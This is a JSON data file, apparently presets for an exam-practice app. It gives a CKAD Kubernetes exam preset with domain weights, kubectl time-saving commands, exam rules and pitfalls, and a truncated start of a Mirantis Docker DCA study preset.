   "icon": "🧩",
   "tagline": "For the app developer on Kubernetes: 15–20 build/deploy/observe tasks in 2 hours, no cluster installation — pure imperative-kubectl speed against a weighted curriculum.",
   "kind": "tasks",
   "focus": "kubernetes",
   "status": "active",
   "statusNote": "",
   "durationMin": 120,
   "taskCount": 20,
   "format": "hands-on performance-based; PSI Bridge secure browser → Remote Desktop with a Linux terminal; each task's infobox names the designated host you must ssh into; remote proctored; ReadMe tab + task Content Panel with a navigation menu, Flag Item to review, and a countdown timer that alerts at 30/15/5 minutes remaining",
   "passMark": 66,
   "curriculumVersion": "CKAD Curriculum v1.35 (exam environment running Kubernetes v1.35)",
   "retakeNote": "Exam price $445 and includes one free retake (cncf.io/training/certification/ckad). Certifications passed on or after 1 April 2024 are valid for 2 years (earlier passes were 3 years); recertification resets it a further 2 years. The CARE program announced on 17 June 2026 covers CKS extending CKA; no CKAD equivalent has been published.",
   "domains": [
    {
     "id": "ckad-env-config-security",
     "name": "Application Environment, Configuration and Security",
     "weight": 25,
     "competencies": [
      "Discover and use resources that extend Kubernetes (CRD, Operators)",
      "Understand authentication, authorization and admission control",
      "Understand requests, limits, quotas",
      "Define resource requirements",
      "Understand ConfigMaps",
      "Create & consume Secrets",
      "Understand ServiceAccounts",
      "Understand Application Security (SecurityContexts, Capabilities, etc.)"
     ]
    },
    {
     "id": "ckad-design-build",
     "name": "Application Design and Build",
     "weight": 20,
     "competencies": [
      "Define, build and modify container images",
      "Choose and use the right workload resource (Deployment, DaemonSet, CronJob, etc.)",
      "Understand multi-container Pod design patterns (e.g. sidecar, init and others)",
      "Utilize persistent and ephemeral volumes"
     ]
    },
    {
     "id": "ckad-deployment",
     "name": "Application Deployment",
     "weight": 20,
     "competencies": [
      "Use Kubernetes primitives to implement common deployment strategies (e.g. blue/green or canary)",
      "Understand Deployments and how to perform rolling updates",
      "Use the Helm package manager to deploy existing packages",
      "Kustomize"
     ]
    },
    {
     "id": "ckad-networking",
     "name": "Services and Networking",
     "weight": 20,
     "competencies": [
      "Demonstrate basic understanding of NetworkPolicies",
      "Provide and troubleshoot access to applications via services",
      "Use Ingress rules to expose applications"
     ]
    },
    {
     "id": "ckad-observability",
     "name": "Application Observability and Maintenance",
     "weight": 15,
     "competencies": [
      "Understand API deprecations",
      "Implement probes and health checks",
      "Use built-in CLI tools to monitor Kubernetes applications",
      "Utilize container logs",
      "Debugging in Kubernetes"
     ]
    }
   ],
   "phases": [
    {
     "id": "preflight",
     "name": "Pre-flight (first 90 seconds)",
     "goal": "CKAD is the more time-pressured of the two exams per task: the work is small, so the overhead of typing dominates. Kill the overhead before task 1.",
     "items": [
      {
       "label": "Read the ReadMe tab before touching the terminal",
       "hint": ""
      },
      {
       "label": "ssh into the host named in task 1's infobox (the base system has NO kubectl, yq, curl or man pages)",
       "hint": "ssh <NODENAME>"
      },
      {
       "label": "Confirm the pre-configured k alias and Bash completion rather than re-creating them",
       "hint": "type k; complete -p kubectl"
      },
      {
       "label": "Export the dry-run generator — CKAD is almost entirely generate-then-edit",
       "hint": "export do='--dry-run=client -o yaml'"
      },
      {
       "label": "Export the force-delete suffix",
       "hint": "export now='--force --grace-period=0'"
      },
      {
       "label": "Make vim YAML-safe — CKAD has more hand-editing of pod templates than CKA",
       "hint": "printf 'set ts=2 sw=2 et ai nu\\nset cursorcolumn\\n' >> ~/.vimrc"
      },
      {
       "label": "Know the paste trap before you hit it: :set paste before pasting a block, :set nopaste after",
       "hint": ":set paste"
      },
      {
       "label": "Confirm cluster and list namespaces once so you recognise the names tasks refer to",
       "hint": "kubectl config current-context && kubectl get ns"
      },
      {
       "label": "Open the allowed docs in the remote desktop's Firefox once, now",
       "hint": ""
      },
      {
       "label": "Compute your per-task budget from the real task count in the navigation menu",
       "hint": "echo $((115 / <TASK_COUNT>))  # minutes per task, 5 min reserve"
      }
     ]
    },
    {
     "id": "task-loop",
     "name": "Per-task loop",
     "goal": "Locate → generate → edit the delta → VERIFY. For CKAD the edit step is where the marks are: probes, securityContext, resources, volumes and multi-container patterns have no imperative form, so generate the shell and hand-write only the block that was asked for.",
     "items": [
      {
       "label": "Beat 0 — read the infobox and ssh to the named host; exit the previous session first",
       "hint": "exit; ssh <NODENAME>"
      },
      {
       "label": "Beat 0 — pin the namespace the task names, once",
       "hint": "kubectl config set-context --current --namespace=<NAMESPACE>"
      },
      {
       "label": "Beat 1 — generate the skeleton with $do rather than typing apiVersion/kind/metadata",
       "hint": "kubectl run <NAME> --image=<IMAGE> $do > <NAME>.yaml"
      },
      {
       "label": "Beat 2 — edit only the delta: probe, securityContext, resources, volumeMounts, initContainers, env",
       "hint": "kubectl explain pod.spec.containers.<FIELD> --recursive"
      },
      {
       "label": "Beat 2 — apply and watch it actually reach Ready",
       "hint": "kubectl apply -f <NAME>.yaml && kubectl get pod <NAME> -n <NAMESPACE> -w"
      },
      {
       "label": "Beat 3 — VERIFY: the env var is really in the container, the probe really passes, the Service really answers",
       "hint": "kubectl exec <POD> -n <NAMESPACE> -- env | grep <KEY>"
      },
      {
       "label": "Beat 3 — for Services/Ingress/NetworkPolicy, prove reachability from a throwaway pod",
       "hint": "kubectl run probe --rm -it --restart=Never --image=busybox:1.36 -- wget -qO- --timeout=3 http://<SVC>.<NAMESPACE>.svc.cluster.local"
      },
      {
       "label": "Over budget? Flag Item to review, note what is left, move on",
       "hint": "echo 'task <N>: <WHAT_IS_LEFT>' >> ~/todo.txt"
      },
      {
       "label": "Exit the SSH session before reading the next task",
       "hint": "exit"
      }
     ]
    },
    {
     "id": "sweep",
     "name": "End-of-exam sweep (last 15 minutes)",
     "goal": "Close out flagged work cheapest-first, then verify the 25%- and 20%-weighted tasks you moved fastest through.",
     "items": [
      {
       "label": "Open Flagged Items and order them by remaining effort, not task number",
       "hint": ""
      },
      {
       "label": "Finish the cheapest flagged task first",
       "hint": ""
      },
      {
       "label": "Sweep for anything you created that never became Ready",
       "hint": "kubectl get pods -A --field-selector=status.phase!=Running -o wide"
      },
      {
       "label": "Re-verify Environment/Configuration/Security tasks — the heaviest single block at 25%",
       "hint": "kubectl get cm,secret,sa,quota,limitrange -n <NAMESPACE>"
      },
      {
       "label": "Re-verify Services and Networking reachability (20%) — a Service with a typo'd selector looks healthy",
       "hint": "kubectl get endpoints <SVC> -n <NAMESPACE>"
      },
      {
       "label": "Save and close every open editor buffer",
       "hint": ":wq"
      },
      {
       "label": "exit back to base so nothing dies mid-write at time-up",
       "hint": "exit"
      }
     ]
    },
    {
     "id": "retro",
     "name": "Retrospective (after the session)",
     "goal": "No report, just a retrospective: where the minutes went and which of the five domains is actually costing you the pass mark.",
     "items": [
      {
       "label": "List every task that exceeded its budget and the one command that would have saved it",
       "hint": ""
      },
      {
       "label": "Tally minutes per domain against weight — note that Observability is only 15% and Env/Config/Security is 25%",
       "hint": ""
      },
      {
       "label": "Count tasks where you typed a pod template by hand instead of generating it",
       "hint": ""
      },
      {
       "label": "Count tasks where the edit was correct but you never verified it inside the container",
       "hint": ""
      },
      {
       "label": "Count host/namespace errors (target: zero)",
       "hint": ""
      },
      {
       "label": "Build the next drill list from the two weakest domains only",
       "hint": ""
      }
     ]
    }
   ],
   "timeSavers": [
    {
     "label": "The $do generator",
     "cmd": "export do='--dry-run=client -o yaml'",
     "why": "CKAD is dominated by 'create a Pod/Deployment/Job that does X'. Generating the skeleton and editing one block is 3–4x faster than typing YAML, and it never gets the apiVersion wrong."
    },
    {
     "label": "Pod with a command and args",
     "cmd": "kubectl run <NAME> --image=<IMAGE> --restart=Never --labels=app=<LABEL> $do --command -- /bin/sh -c '<CMD>' > pod.yaml",
     "why": "The classic CKAD opener. Everything before '--' is a kubectl flag, everything after is the container command; '--command' makes it command: rather than args:. Getting this shape right first time saves a re-edit."
    },
    {
     "label": "One-off throwaway pod to test something",
     "cmd": "kubectl run tmp --rm -it --restart=Never --image=busybox:1.36 -- sh",
     "why": "Your verification tool for Services, DNS and NetworkPolicies. --rm cleans up so you do not leave stray objects that confuse a later task."
    },
    {
     "label": "Deployment skeleton",
     "cmd": "kubectl create deployment <NAME> --image=<IMAGE> --replicas=3 --port=8080 $do > deploy.yaml",
     "why": "The base for rolling-update, canary and probe tasks. Generate it, then add only the block the task names."
    },
    {
     "label": "Rolling updates and rollbacks without editing YAML",
     "cmd": "kubectl set image deployment/<NAME> <CONTAINER>=<IMAGE>:<TAG> -n <NAMESPACE> --record=false",
     "why": "Pairs with 'kubectl rollout status deployment/<NAME>', 'kubectl rollout history deployment/<NAME>' and 'kubectl rollout undo deployment/<NAME> --to-revision=<N>'. Whole-task-in-three-commands for the Application Deployment domain (20%)."
    },
    {
     "label": "Expose a workload as a Service",
     "cmd": "kubectl expose deployment <NAME> --port=80 --target-port=8080 --name=<SVC> $do",
     "why": "Copies the selector off the live object — the field most often typo'd by hand. Verify with 'kubectl get endpoints <SVC>': empty endpoints means the selector is wrong, and the Service will still look fine."
    },
    {
     "label": "Ingress imperatively",
     "cmd": "kubectl create ingress <NAME> --rule='<HOST>/<PATH>*=<SVC>:80' --class=<CLASS> -n <NAMESPACE> $do",
     "why": "Ingress YAML is fiddly (pathType, backend.service.port.number). The imperative form gets the nesting right; you then only adjust pathType if the task demands Exact."
    },
    {
     "label": "CronJob and Job",
     "cmd": "kubectl create cronjob <NAME> --image=<IMAGE> --schedule='*/1 * * * *' $do -- /bin/sh -c '<CMD>'",
     "why": "Also 'kubectl create job <NAME> --from=cronjob/<CRONJOB>' to trigger a run for verification without waiting for the schedule. Add completions/parallelism/backoffLimit/activeDeadlineSeconds by editing the generated file."
    },
    {
     "label": "ConfigMaps from literals, files and env-files",
     "cmd": "kubectl create configmap <NAME> --from-literal=<KEY>=<VALUE> --from-file=<FILE> --from-env-file=<ENVFILE> -n <NAMESPACE> $do",
     "why": "Three ingestion modes the exam asks for by name. Consume it with 'envFrom: - configMapRef:' for all keys, or valueFrom.configMapKeyRef for one — read the task wording carefully, they score differently."
    },
    {
     "label": "Secrets, base64 handled for you",
     "cmd": "kubectl create secret generic <NAME> --from-literal=password=<VALUE> -n <NAMESPACE> $do",
     "why": "The #1 silent CKAD failure is writing plaintext into .data instead of base64 (or forgetting stringData:). Let kubectl do it. Read it back with 'kubectl get secret <NAME> -o jsonpath=\"{.data.<KEY>}\" | base64 -d'."
    },
    {
     "label": "ServiceAccounts and tokens",
     "cmd": "kubectl create serviceaccount <SA> -n <NAMESPACE> && kubectl create token <SA> -n <NAMESPACE>",
     "why": "'kubectl create token' is the modern way to mint a short-lived token — auto-generated Secret tokens no longer exist. Attach with 'kubectl set serviceaccount deployment <NAME> <SA>' rather than editing the pod template."
    },
    {
     "label": "Quotas and limit ranges",
     "cmd": "kubectl create quota <NAME> --hard=cpu=1,memory=1Gi,pods=2 -n <NAMESPACE> $do",
     "why": "Straight from the 'Understand requests, limits, quotas' competency inside the 25% domain. One line instead of a nested manifest."
    },
    {
     "label": "Read the schema instead of the docs site",
     "cmd": "kubectl explain pod.spec.containers.livenessProbe --recursive",
     "why": "Probes, securityContext, lifecycle hooks and volume types have no imperative generator, so you WILL hand-write them — explain --recursive gives you the exact field tree in 15 seconds without a browser round-trip."
    },
    {
     "label": "Set resource requests/limits without opening an editor",
     "cmd": "kubectl set resources deployment <NAME> --requests=cpu=100m,memory=128Mi --limits=cpu=500m,memory=256Mi -n <NAMESPACE>",
     "why": "'kubectl set' also does image, env, serviceaccount and selector — four common CKAD edits that people do the slow way through kubectl edit."
    },
    {
     "label": "Environment variables in one line",
     "cmd": "kubectl set env deployment/<NAME> <KEY>=<VALUE> --from=configmap/<NAME> -n <NAMESPACE>",
     "why": "--from=configmap/<NAME> or --from=secret/<NAME> wires up every key at once; 'kubectl set env deployment/<NAME> --list' verifies it instantly."
    },
    {
     "label": "Label selectors and quick labelling",
     "cmd": "kubectl label pod <POD> <KEY>=<VALUE> --overwrite -n <NAMESPACE>; kubectl get pods -l '<KEY> in (<A>,<B>)' --show-labels",
     "why": "Canary and blue/green tasks are label exercises. --overwrite is required to change an existing label and is the flag people forget; 'kubectl annotate' takes the same shape."
    },
    {
     "label": "jsonpath to write the answer to a file",
     "cmd": "kubectl get pods -n <NAMESPACE> -o jsonpath='{range .items[*]}{.metadata.name}{\"\\t\"}{.status.podIP}{\"\\n\"}{end}' > /opt/<FILE>",
     "why": "Many CKAD tasks grade a file's contents. jsonpath (or -o custom-columns=...) produces exactly the requested shape; --sort-by works alongside it when order is specified."
    },
    {
     "label": "Events, newest last, for the Observability domain",
     "cmd": "kubectl get events -n <NAMESPACE> --sort-by=.metadata.creationTimestamp --field-selector type=Warning",
     "why": "First command for any 'this app will not start' task. 'kubectl events --for pod/<POD> -n <NAMESPACE>' gives one object's timeline; pair with 'kubectl logs <POD> --previous' for CrashLoopBackOff."
    },
    {
     "label": "Logs across a whole selector",
     "cmd": "kubectl logs -l app=<LABEL> -n <NAMESPACE> --all-containers --prefix --tail=50",
     "why": "One command instead of per-pod logs, and --prefix tells you which pod said what — essential in multi-container and multi-replica tasks."
    },
    {
     "label": "Clone a live object into a clean manifest",
     "cmd": "kubectl get deployment <NAME> -n <NAMESPACE> -o yaml --show-managed-fields=false > <NAME>.yaml",
     "why": "Fastest path for 'create a second version of this with X changed' (canary/blue-green). Strip status:, metadata.uid, metadata.resourceVersion and metadata.creationTimestamp before applying, or the apply is rejected."
    },
    {
     "label": "Replace when a field is immutable",
     "cmd": "kubectl replace --force -f <FILE>",
     "why": "Deployment selector.matchLabels and Job selector cannot be changed in place. replace --force deletes and recreates in one step instead of a manual delete/create."
    },
    {
     "label": "Force-delete a stuck pod",
     "cmd": "kubectl delete pod <POD> -n <NAMESPACE> --force --grace-period=0",
     "why": "Stops you waiting out a 30s termination grace period (or an indefinite one) while the clock runs. Export it once as $now."
    },
    {
     "label": "Switch context / pin namespace",
     "cmd": "kubectl config use-context <CONTEXT>; kubectl config set-context --current --namespace=<NAMESPACE>",
     "why": "Pinning removes -n from every subsequent command and stops objects landing in default. Re-check with 'kubectl config current-context' at the start of each task."
    },
    {
     "label": "Debug a running pod without restarting it",
     "cmd": "kubectl debug -it <POD> --image=busybox:1.36 --target=<CONTAINER> -n <NAMESPACE>",
     "why": "Ephemeral container into a distroless or shell-less image — the only way to inspect many real app containers. Beats rebuilding the pod for the Debugging-in-Kubernetes competency."
    },
    {
     "label": "Helm for the Application Deployment domain",
     "cmd": "helm install <RELEASE> <CHART> -n <NAMESPACE> --set <KEY>=<VALUE> --version <VERSION>",
     "why": "'helm show values <CHART>' then '--set' or '-f values.yaml'; 'helm upgrade --install', 'helm list -A', 'helm uninstall'. helm.sh/docs is an explicitly allowed documentation site — bookmark it, do not guess flags."
    },
    {
     "label": "Kustomize without leaving kubectl",
     "cmd": "kubectl kustomize <DIR> | less && kubectl apply -k <DIR>",
     "why": "'Kustomize' is a named CKAD competency. Render first with kubectl kustomize to see what will be applied, then apply -k — rendering catches a bad patch before it hits the cluster."
    }
   ],
   "allowedDocs": [
    {
     "label": "Kubernetes Documentation",
     "url": "https://kubernetes.io/docs",
     "note": "Allowed including all language translations (e.g. https://kubernetes.io/zh/docs/); English is the most up to date. Using the site's own search is allowed, but you must NOT open external search results."
    },
    {
     "label": "Kubernetes Blog",
     "url": "https://kubernetes.io/blog/",
     "note": "Allowed in full."
    },
    {
     "label": "Helm Documentation",
     "url": "https://helm.sh/docs",
     "note": "Allowed — directly relevant to the 'Use the Helm package manager to deploy existing packages' competency in the 20% Application Deployment domain."
    },
    {
     "label": "Terminal man pages and distribution docs",
     "url": "",
     "note": "man pages and documents installed by the distribution (/usr/share and subdirectories) are allowed from inside the exam terminal."
    }
   ],
   "rules": [
    {
     "kind": "required",
     "text": "Each task's infobox names the host to work on; ssh into that host to perform the task and exit back to the base system afterwards.",
     "enforceable": "Per-task host field the user confirms before the timer starts; persistent current-host banner.",
     "source": "https://docs.linuxfoundation.org/tc-docs/certification/tips-cka-and-ckad",
     "confidence": "official"
    },
    {
     "kind": "required",
     "text": "All tasks must be completed on a designated SSH host — the base system (hostname 'base') has none of the exam tooling installed.",
     "enforceable": "Pre-flight gate: no task commands offered until the ssh step is ticked.",
     "source": "https://docs.linuxfoundation.org/tc-docs/certification/tips-cka-and-ckad",
     "confidence": "official"
    },
    {
     "kind": "allowed",
     "text": "Elevated privileges via 'sudo -i' are available on any host.",
     "enforceable": "",
     "source": "https://docs.linuxfoundation.org/tc-docs/certification/tips-cka-and-ckad",
     "confidence": "official"
    },
    {
     "kind": "allowed",
     "text": "Every SSH host ships kubectl with the 'k' alias and Bash autocompletion, plus yq, curl, wget and man pages, pre-installed and pre-configured.",
     "enforceable": "Pre-flight skips alias/completion setup and spends the time on exports and vim instead.",
     "source": "https://docs.linuxfoundation.org/tc-docs/certification/tips-cka-and-ckad",
     "confidence": "official"
    },
    {
     "kind": "limited",
     "text": "Documentation is limited to kubernetes.io/docs, kubernetes.io/blog and helm.sh/docs, in the Firefox browser inside the remote desktop. On-site search allowed; opening external search results is not.",
     "enforceable": "Allow-list bookmarks are the only outbound links offered during a session.",
     "source": "https://docs.linuxfoundation.org/tc-docs/certification/certification-resources-allowed",
     "confidence": "official"
    },
    {
     "kind": "banned",
     "text": "Notes or unauthorized materials; the desk must be clear of all notes and electronics, and no one else may be in the room.",
     "enforceable": "Session start states plainly that this app must be closed before the real exam.",
     "source": "https://docs.linuxfoundation.org/tc-docs/certification/lf-handbook2/exam-rules-and-policies",
     "confidence": "official"
    },
    {
     "kind": "banned",
     "text": "Internet browsing using installed tools such as Vim and Emacs, and any unauthorized digital resources.",
     "enforceable": "",
     "source": "https://docs.linuxfoundation.org/tc-docs/certification/lf-handbook2/exam-rules-and-policies",
     "confidence": "official"
    },
    {
     "kind": "required",
     "text": "The room must be quiet, private and well-lit.",
     "enforceable": "",
     "source": "https://docs.linuxfoundation.org/tc-docs/certification/lf-handbook2/exam-rules-and-policies",
     "confidence": "official"
    },
    {
     "kind": "limited",
     "text": "The Pause Exam function does not stop the timer; alerts appear at 30, 15 and 5 minutes remaining.",
     "enforceable": "Session countdown mirrors the 30/15/5 alerts and opens the sweep phase at 15 minutes.",
     "source": "https://docs.linuxfoundation.org/tc-docs/certification/lf-handbook2/exam-user-interface/examui-performance-based-exams",
     "confidence": "official"
    },
    {
     "kind": "allowed",
     "text": "Terminal copy/paste is Ctrl+Shift+C / Ctrl+Shift+V; elsewhere in the remote desktop it is Ctrl+C / Ctrl+V.",
     "enforceable": "",
     "source": "https://docs.linuxfoundation.org/tc-docs/certification/tips-cka-and-ckad",
     "confidence": "official"
    }
   ],
   "pitfalls": [
    {
     "text": "Working on the wrong host or in the wrong namespace. Every task infobox names where the work belongs, and CKAD tasks are short enough that people skip straight to the verb — or stay in the previous SSH session.",
     "cost": "The whole task scores zero and you leave objects in a namespace where a later task will trip over them. The most common avoidable failure on the exam.",
     "guard": "Per-task host and namespace fields the user confirms before the timer starts; a persistent current-host/namespace banner; a nudge when consecutive tasks name different hosts with no exit/ssh logged."
    },
    {
     "text": "Not verifying the end state. The Deployment exists but the pod is CrashLooping, the env var never made it into the container, the Service has no endpoints because the selector has a typo.",
     "cost": "Zero on a task that felt finished — and in CKAD the tasks are short, so you had the time to check and did not.",
     "guard": "A task cannot be closed on an apply alone; it needs a get/exec/endpoints/wget check that shows the requested state."
    },
    {
     "text": "Base64 and Secret handling: writing plaintext into .data instead of stringData, or forgetting to decode when reading back.",
     "cost": "The object applies cleanly and the app fails silently — pure lost marks in the heaviest (25%) domain.",
     "guard": "Secret tasks always surface the 'kubectl create secret ... $do' form first and the '| base64 -d' read-back as the verification step."
    },
    {
     "text": "Editing an immutable field and not noticing the apply failed — Deployment selector.matchLabels, Job selector, Service clusterIP. kubectl edit writes a temp file and prints an error you scroll past.",
     "cost": "Task scores zero while the object still looks right.",
     "guard": "Immutable-field warning on edit-type tasks, with 'kubectl replace --force -f <FILE>' offered inline."
    },
    {
     "text": "Hand-writing pod templates in a vim with default tab settings, then fighting YAML indentation errors.",
     "cost": "3–5 minutes per task, and it is the single biggest reason a prepared candidate does not finish 15–20 tasks in 120 minutes.",
     "guard": "Pre-flight will not complete until the vimrc line is written; every task type surfaces its $do one-liner before any YAML."
    },
    {
     "text": "Leaving a task half-done instead of flagging it and moving on — especially probes and multi-container patterns, where 'nearly right' is worth nothing.",
     "cost": "You pay the time twice and score once (or not at all).",
     "guard": "Flagging requires a one-line 'what is left' note that the sweep phase replays."
    },
    {
     "text": "Overrunning on one debugging task. Application Observability and Maintenance is only 15% of the score, yet it generates the most seductive rabbit holes.",
     "cost": "Two or three cheap tasks in the 25% and 20% domains never get attempted — a straight arithmetic loss.",
     "guard": "Per-task countdown against the computed budget, a nudge at 1.5x, and a domain-weighted score estimate that shows what abandoning this task actually costs versus what finishing it gains."
    },
    {
     "text": "Pasting a manifest into vim without ':set paste' and getting cascading auto-indent, then spending three minutes re-indenting.",
     "cost": "Minutes per occurrence, plus the risk of an invisible structural error.",
     "guard": "Any task whose steps include pasting a block prepends ':set paste' and appends ':set nopaste'."
    },
    {
     "text": "Not saving before time-up: an open vim buffer or a manifest written to disk but never applied when the clock hits zero.",
     "cost": "A fully solved task scores zero.",
     "guard": "The 5-minute alert opens a 'save every buffer, apply every pending manifest' checklist dismissed item by item."
    },
    {
     "text": "Reaching for kubernetes.io for something 'kubectl explain' answers in 15 seconds, or hunting a Helm flag by guesswork when helm.sh/docs is explicitly allowed.",
     "cost": "60–120 seconds per lookup, several times an exam.",
     "guard": "Docs bookmarks open with a visible lookup timer and an 'explain instead?' prompt carrying the exact explain path for the current task's resource."
    },
    {
     "text": "Leaving throwaway debug pods behind ('kubectl run tmp' without --rm), so a later task's 'list all pods in this namespace' answer is wrong.",
     "cost": "Corrupts a later task's graded output.",
     "guard": "Any suggested throwaway-pod command includes --rm, and the sweep phase lists objects you created that no task asked for."
    }
   ],
   "retroSections": [
    "Time per task vs computed budget (which tasks blew past 1.5x)",
    "Score estimate by weighted domain — Env/Config/Security 25%, Design 20%, Deployment 20%, Networking 20%, Observability 15%",
    "Tasks flagged for review, and which ones you never returned to",
    "Applied-but-not-verified: tasks closed without an in-container or endpoint check",
    "Host/namespace errors (target: zero)",
    "Imperative-generation misses: pod templates typed by hand that $do or kubectl set could have produced",
    "Documentation lookups over 90 seconds, and what kubectl explain would have answered",
    "Two weakest domains → drill list for the next session"
   ],
   "sources": [
    "https://www.cncf.io/training/certification/ckad/",
    "https://github.com/cncf/curriculum — CKAD_Curriculum_v1.35.pdf (domain weights and competencies verbatim)",
    "https://docs.linuxfoundation.org/tc-docs/certification/faq-cka-ckad-cks (pass mark 66%, Kubernetes v1.35 environment, 2-year validity)",
    "https://docs.linuxfoundation.org/tc-docs/certification/tips-cka-and-ckad (15–20 performance-based tasks, ssh host model, sudo -i, pre-installed tooling, copy/paste keys)",
    "https://docs.linuxfoundation.org/tc-docs/certification/certification-resources-allowed (documentation allow-list)",
    "https://docs.linuxfoundation.org/tc-docs/certification/lf-handbook2/exam-rules-and-policies (room, notes and browsing rules)",
    "https://docs.linuxfoundation.org/tc-docs/certification/lf-handbook2/exam-user-interface (Flag Item to review, navigation menu)",
    "https://docs.linuxfoundation.org/tc-docs/certification/lf-handbook2/exam-user-interface/examui-performance-based-exams (timer alerts at 30/15/5, Pause does not stop the timer)",
    "https://training.linuxfoundation.org/certification-policy-change-2024/ (2-year validity from 1 April 2024)"
   ],
   "unverified": [
    "Exact task count per exam form. The Linux Foundation states '15-20 performance-based tasks' covering CKA and CKAD; taskCount is set to the conservative upper bound of 20 and the app should recompute the per-task budget from the count shown in the exam navigation menu.",
    "Whether CKAD tasks still open with an explicit 'kubectl config use-context <CONTEXT>' line. Current official instructions describe a per-task designated SSH host and say nothing about per-task contexts; treat 'confirm where you are' as host AND context until your form's ReadMe says otherwise.",
    "Presence of an in-exam notepad or scratch pad — not documented in the exam UI pages.",
    "Length of the eligibility window in which the free retake must be taken — not stated on the CNCF exam page.",
    "Whether the CARE program (announced 17 June 2026, CKS extending CKA) has or will have any CKAD equivalent — the announcement does not address CKAD.",
    "The CKAD v1.35 curriculum PDF prints 'Understand API depreciations' [sic]; reproduced here as 'Understand API deprecations'."
   ],
   "appFeatures": [
    "Flagging a task for review is a feature of THIS app, not a documented feature of the exam UI. The Linux Foundation documents a ReadMe and a Content Panel; it does not publish a flag control."
   ],
   "notes": []
  },
  {
   "id": "dca",
   "name": "Mirantis Docker Certified Associate (DCA)",
   "icon": "🐳",
   "tagline": "For the engineer who wants the Docker blueprint cold — now a Mirantis exam, and the blueprint has not moved since 2020. Study mode, not a task clock.",
   "kind": "tasks",
   "focus": "containers",
   "status": "active",
   "statusNote": "Active and currently sold. Docker Inc. no longer runs it — the certification moved to Mirantis with the Docker Enterprise platform business (announced November 2019), and docs.docker.com/certification now 404s. Search results calling DCA \"retired\" are wrong: Mirantis sells it at $199 USD / €200 and republished the blueprint as v1.5 in January 2025. What IS worth knowing: v1.5 still tests UCP and DTR by name — products since renamed Mirantis Kubernetes Engine and Mirantis Secure Registry — so part of the exam covers a stack you will not meet in current Docker documentation. Re-check the Mirantis pages before buying a seat.",
   "durationMin": 90,
   "taskCount": 55,
   "format": "13 multiple choice + 42 discrete option multiple choice (DOMC) = 55 items in 90 minutes. Remotely proctored over Zoom; requires Google Chrome and the ability to install a Chrome extension. Not hands-on — no terminal, no cluster, so this preset models a domain-weighted STUDY session rather than an exam task loop. Rehearse DOMC: options appear one at a time, you answer yes/no to each, the item ends as soon as it resolves, and you cannot see the full option set or revise an answer.",
   "passMark": 0,
   "curriculumVersion": "DCA Study Guide v1.5 (January 2025)",
   "retakeNote": "Certification is valid for 2 years and must be renewed biannually. A failed attempt requires a 14-day wait before retesting, and the full fee is payable for each attempt — $199 USD / €200 per exam via the Mirantis webstore, with volume packs of 10/25/50/100. Several third-party sites advertise '$195 including one free retake within 1 year'; that does not match the Mirantis store or training pages, so do not plan around a free retake.",
   "domains": [
    {
     "id": "orchestration",
     "name": "Orchestration",
     "weight": 25,
     "competencies": [
      "Complete the setup of a swarm mode cluster with manager and worker nodes",
      "Extend instructions for running individual containers into services running under swarm",
      "Describe the importance of quorum in a swarm cluster",
      "Describe the difference between running a container and running a service",
      "Interpret the output of docker inspect commands",
      "Convert an application deployment into a stack file using a YAML compose file with docker stack deploy",
      "Manipulate a running stack of services (increase replicas, add networks, publish ports, mount volumes)",
      "Run replicated and global services",
      "Apply node labels to demonstrate placement of tasks",
      "Use templates with docker service create",
      "Identify the steps needed to troubleshoot a service not deploying",
      "Describe how a Dockerized application communicates with legacy systems",
      "Deploy containerized workloads as Kubernetes pods and deployments",
      "Provide configuration to Kubernetes pods using configMaps and secrets"
     ]
    },
    {
     "id": "images",
     "name": "Image Creation, Management, and Registry",
     "weight": 20,
     "competencies": [
      "Describe the use of Dockerfile and its options (ADD, COPY, VOLUME, EXPOSE, ENTRYPOINT)",
      "Identify and display the main parts of a Dockerfile",
      "Create an efficient image via a Dockerfile",
      "Use CLI commands to manage images: list, delete, prune, rmi",
      "Inspect images and report specific attributes using filter and format",
      "Tag an image",
      "Apply a file to create a Docker image",
      "Display the layers of a Docker image",
      "Modify an image to a single layer",
      "Registry functions: deploy a registry, log into a registry, search a registry, push, sign, pull and delete images"
     ]
    },
    {
     "id": "install-config",
     "name": "Installation and Configuration",
     "weight": 15,
     "competencies": [
      "Describe sizing requirements for installation",
      "Set up repo, select a storage driver, install the Docker engine on multiple platforms",
      "Configure logging drivers (splunk, journald, etc.)",
      "Set up swarm, configure managers, add nodes, set up the backup schedule",
      "Create and manage users and teams",
      "Configure the Docker daemon to start on boot",
      "Use certificate-based client-server authentication so a Docker daemon may access images on a registry",
      "Describe the use of namespaces, cgroups, and certificate configuration",
      "Interpret errors to troubleshoot installation issues without assistance",
      "Deploy Docker engine, UCP and DTR on AWS and on-premises in an HA configuration",
      "Configure backups for UCP and DTR"
     ]
    },
    {
     "id": "networking",
     "name": "Networking",
     "weight": 15,
     "competencies": [
      "Describe the Container Network Model and how it interfaces with the engine, network and IPAM drivers",
      "Describe the types and use cases for the built-in network drivers",
      "Describe the traffic that flows between the Docker engine, registry and UCP controllers",
      "Create a Docker bridge network for developers to use for their containers",
      "Publish a port so an application is accessible externally; identify which IP and port a container is reachable on",
      "Compare and contrast host and ingress publishing modes",
      "Configure Docker to use external DNS",
      "Use Docker to load balance HTTP/HTTPS traffic to an application (L7 load balancing with Docker EE)",
      "Deploy a service on a Docker overlay network",
      "Troubleshoot container and engine logs to resolve connectivity issues between containers",
      "Route traffic to Kubernetes pods using ClusterIP and NodePort services",
      "Describe the Kubernetes container network model"
     ]
    },
    {
     "id": "security",
     "name": "Security",
     "weight": 15,
     "competencies": [
      "Describe security administration and tasks",
      "Describe the process of signing an image",
      "Describe default engine security and swarm default security",
      "Describe MTLS",
      "Describe identity roles; compare and contrast UCP workers and managers",
      "Use external certificates with UCP and DTR",
      "Demonstrate that an image passes a security scan",
      "Enable Docker Content Trust",
      "Configure RBAC with UCP",
      "Integrate UCP with LDAP/AD",
      "Create UCP client bundles"
     ]
    },
    {
     "id": "storage",
     "name": "Storage and Volumes",
     "weight": 10,
     "competencies": [
      "Identify the correct graph drivers to use with various operating systems",
      "Configure devicemapper",
      "Compare and contrast object and block storage and when each should be used",
      "Describe how an application is composed of layers and where those layers reside on the filesystem",
      "Describe the use of volumes for persistent storage",
      "Identify the steps to clean up unused images on a filesystem and in DTR",
      "Describe how storage can be used across cluster nodes",
      "Provision persistent storage to a Kubernetes pod using persistentVolumes",
      "Describe the relationship between CSI drivers, storageClass, persistentVolumeClaim and volume objects in Kubernetes"
     ]
    }
   ],
   "phases": [
    {
     "id": "lab-up",
     "name": "Lab up (5 minutes, once per session)",
